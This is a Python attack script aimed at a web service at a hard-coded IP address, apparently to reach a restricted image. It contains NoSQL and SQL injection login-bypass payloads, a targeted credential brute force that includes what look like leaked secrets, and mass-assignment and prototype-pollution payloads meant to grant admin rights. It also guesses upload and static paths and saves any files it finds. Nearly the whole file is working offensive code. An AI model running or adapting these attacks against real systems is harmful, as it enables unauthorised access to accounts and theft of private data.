import requests
import json
import time

base = "http://144.79.188.36:6500"

print("--- 1. Testing NoSQL / SQL Injection on /api/session ---")
injections = [
    {"username": "admin", "password": {"$ne": None}},
    {"username": "admin", "password": {"$gt": ""}},
    {"username": {"$gt": ""}, "password": {"$gt": ""}},
    {"username": {"$ne": None}, "password": {"$ne": None}},
    {"username": "admin'--", "password": "a"},
    {"username": "admin' OR 1=1--", "password": "a"},
    {"username": "' OR 1=1--", "password": "a"},
    {"username": "admin\" OR 1=1--", "password": "a"},
    {"username": "admin' OR '1'='1", "password": "' OR '1'='1"},
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin", "password": "a' or '1'='1"},
    {"username": "admin'/*", "password": "*/--"},
]

for payload in injections:
    try:
        r = requests.post(f"{base}/api/session", json=payload, timeout=3)
        if r.status_code == 200:
            print(f"[!] SUCCESS INJECTION: {payload} -> {r.text}")
            cookie = r.cookies.get("anhhop_session")
            print(f"    Cookie: {cookie}")
        elif r.status_code != 401 and r.status_code != 400:
            print(f"[*] Interesting response ({r.status_code}): {payload} -> {r.text[:200]}")
    except Exception as e:
        print(f"Error {payload}: {e}")

print("\n--- 2. Testing Targeted Admin Credential Combinations ---")
usernames = [
    "admin", "administrator", "root", "pablo", "pablo_escobar", "Pablo_Escobar",
    "anhhop", "anh_hop", "ongtrum", "ong_trum", "trum", "boss", "pc04", "PC04",
    "luongvd", "pabloescobar", "admin_pablo", "escobar"
]
passwords = [
    "admin", "admin123", "admin@123", "password", "123456", "12345678",
    "pablo", "pablo_escobar", "Pablo_Escobar", "anhhop", "anh_hop", "ongtrum",
    "luongvd", "PC04", "pc04", "escobar", "pabloescobar", "root",
    "RqriV3LFYnQcOwZoTc5UQJLP59wyhg99VATMAqrIhlo=", "91fS3SAVqIPnMb8UEB0GWA", "5Oql/E6+RenWpfIQ",
    "WebView Tool", "bacninh", "BacNinh", "bac_ninh", "Bac_Ninh", "flycam", "drone"
]

found_admin = False
for u in usernames:
    if found_admin: break
    for p in [u, u.lower(), u.upper()] + passwords:
        try:
            r = requests.post(f"{base}/api/session", json={"username": u, "password": p}, timeout=2)
            if r.status_code == 200:
                data = r.json()
                print(f"[!] LOGIN SUCCESS: {u} / {p} -> {data}")
                if data.get("user", {}).get("role") == "admin":
                    print(f"[!!!] ADMIN FOUND: {u} / {p}")
                    found_admin = True
                    # Download image 3!
                    s_admin = requests.Session()
                    s_admin.cookies.set("anhhop_session", r.cookies.get("anhhop_session"))
                    r3 = s_admin.get(f"{base}/api/images/3")
                    print(f"Image 3 status: {r3.status_code}, len: {len(r3.content)}")
                    with open("notes/inbox/3.jpg", "wb") as f:
                        f.write(r3.content)
                    print("Saved notes/inbox/3.jpg!")
                    break
        except Exception as e:
            pass

print("\n--- 3. Testing Mass Assignment / Prototype Pollution on Login ---")
mass_payloads = [
    {"username": "luongvd", "password": "luongvd", "role": "admin"},
    {"username": "luongvd", "password": "luongvd", "isAdmin": True},
    {"username": "luongvd", "password": "luongvd", "admin": True},
    {"username": "luongvd", "password": "luongvd", "__proto__": {"role": "admin"}},
    {"username": "luongvd", "password": "luongvd", "__proto__": {"isAdmin": True}},
]

for p in mass_payloads:
    try:
        r = requests.post(f"{base}/api/session", json=p, timeout=3)
        if r.status_code == 200:
            print(f"Login with mass payload: {p} -> {r.text}")
            cookie = r.cookies.get("anhhop_session")
            # Try to get image 3
            r3 = requests.get(f"{base}/api/images/3", cookies={"anhhop_session": cookie})
            if r3.status_code == 200:
                print(f"[!] Bypassed image 3 via {p}! Size: {len(r3.content)}")
                with open("notes/inbox/3.jpg", "wb") as f:
                    f.write(r3.content)
    except Exception as e:
        print(f"Error {p}: {e}")

print("\n--- 4. Testing Static File / Upload Route Direct Access ---")
filenames = [
    "3.jpg", "3.png", "3.jpeg", "image3.jpg", "image_3.jpg", "img3.jpg", "img_3.jpg",
    "map.jpg", "flag.jpg", "location.jpg", "drone.jpg", "flycam.jpg", "delivery.jpg",
    "kho.jpg", "secret.jpg", "admin.jpg", "pablo.jpg", "images.jpg", "pexels.jpg"
]
prefixes = [
    "/uploads/", "/static/uploads/", "/public/uploads/", "/images/", "/assets/",
    "/storage/", "/media/", "/files/", "/api/uploads/", "/data/"
]

for pref in prefixes:
    for fn in filenames:
        url = f"{base}{pref}{fn}"
        try:
            r = requests.get(url, timeout=1)
            if r.status_code == 200 and len(r.content) > 100:
                print(f"[!] FOUND STATIC FILE: {url} ({len(r.content)} bytes)")
                with open(f"notes/inbox/static_{fn}", "wb") as f:
                    f.write(r.content)
        except Exception:
            pass
